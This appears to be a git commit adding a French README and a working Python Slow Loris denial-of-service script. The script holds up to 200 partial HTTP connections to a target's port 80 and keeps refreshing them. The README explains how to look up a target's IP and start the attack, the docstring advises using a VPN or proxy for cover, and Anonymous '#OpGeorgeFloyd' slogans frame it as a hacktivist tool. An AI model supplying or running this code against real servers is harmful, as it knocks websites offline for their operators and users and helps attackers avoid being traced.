770b28aa187997647d699494d5963473fa9d2f8e
Commandant-Z <zakoussemc@gmail.com>
2020-06-01 04:08:06 +0400

    Add files via upload

---
+++ README.md
@@ -0,0 +1,44 @@
+# Slow Loris
+
+L'attaque de type Slow Loris est une attaque DoS (deni de service) s'attaquant à une adresse IP précisée.
+Pour faire simple, imaginez 100 grand-mères en train de discuter avec une caissière en même temps dans un supermarché, tous 
+les autres clients resteront bloqués. Et bien c'est pareil mais avec un site internet au lieu d'une caissière et des requêtes
+au lieu des grand-mères.
+
+## Installation
+
+Téléchargez le fichier. Il faut au préalable avoir les modules :
+socket - random - time - sys. (Déjà présents sur Python de base).
+
+## Usage
+
+Après l'installation, commencez d'abord par trouver l'adresse IP de la cible (Target) recherchée.
+Pour cela, utilisez l'invité de commande et exécutez la commande suivante :
+
+```bash
+ping example.com
+```
+
+Il faut ensuite lancer le programme avec l'adresse IP correspondante.
+Pour cela, utilisez de nouveau l'invité de commande et exécutez la commande suivante :
+
+```bash
+python slow_loris.py 192.168.2.1
+```
+
+Il faut bien entendu remplacer l'adresse IP par l'adresse IP de la cible.
+
+L'attaque commencera.
+
+## Contributing
+
+Si vous souhaitez modifier le programme. Faites une requête pull ou une issue.
+Ce sera un plaisir.
+
+## Crédits.
+
+Merci à https://github.com/adrianchifor/pyslowloris pour l'implémentation Python du slow_loris.
+
+We are Anonymous. We are Legion. We do not forgive. We do not forget. Expect us.
+
+- COMMANDANT Z - #OpGeorgeFloyd.
---
+++ slow_loris.py
@@ -0,0 +1,86 @@
+"""
+Modèle d'attaque de type slow loris basé sur le principe de u/adrianchifor.
+
+#Utilisation :
+Commencez par trouver l'adresse IP du target. Pour cela, utilisez l'invité de commande (cmd).
+- Tapez la commande suivante : ping "url"
+L'adresse IP correspondante s'affichera.
+- Tapez ensuite la commande suivante : python slowloris.py "adresse_ip"
+L'attaque a desormais commencé.
+
+#Précautions à prendre :
+Nous vous conseillons d'utiliser un VPN / Proxy avant de débuter l'attaque slow loris.
+
+Modules utilisiés :
+socket - random - time - sys.
+Présent fondamentalement dans Python.
+
+Développé par le Commandant Z.
+@ZakousseMC.
+#JusticeForGeorgeFloyd.
+"""
+
+import socket
+import random
+import time
+import sys
+
+headers = [
+    "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Accept-language: en-US,en"
+]
+
+sockets = []
+
+def initSocket(ip):
+    """
+    Initialisation du socket qui
+    sera envoyé à l'adresse ip choisie.
+    """
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(4)
+    s.connect((ip, 80))
+    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1337)).encode("utf-8")) #CRÉATION DE LA REQUÊTE GET.
+
+    for header in headers:
+        s.send("{}\r\n".format(header).encode("utf-8")) #ENVOI...
+
+    return s
+
+if __name__ == "__main__": #START
+    if len(sys.argv) != 2:
+        print("Utiliser le programme de la manière suivante : python {} example.com".format(sys.argv[0])) #EXPLICATION - USAGE.
+        sys.exit()
+
+    ip = sys.argv[1]
+    count = 200
+    print("Début d'envoi des socket {}. Connection à l'adresse. {} sockets.".format(ip, count)) #DÉBUT - LOG - ENVOI...
+
+    for _ in range(count):
+        try:
+            print("Socket {}".format(_))
+            s = initSocket(ip)
+        except socket.error:
+            break
+
+        sockets.append(s)
+
+    while True:
+        print("Connecté à {} sockets. Envoi des headers - OpAlpha...".format(len(sockets))) #ENVOI...
+
+        for s in list(sockets):
+            try:
+                s.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8")) #ENVOI...
+            except socket.error:
+                sockets.remove(s)
+
+        for _ in range(count - len(sockets)):
+            print("Réouverture des sockets fermés en cours...")
+            try:
+                s = initSocket(ip)
+                if s:
+                    sockets.append(s) #RÉOUVERTURE DES SOCKETS.
+            except socket.error:
+                break
+
+        time.sleep(15) #TEMPS PAR SOCKET.
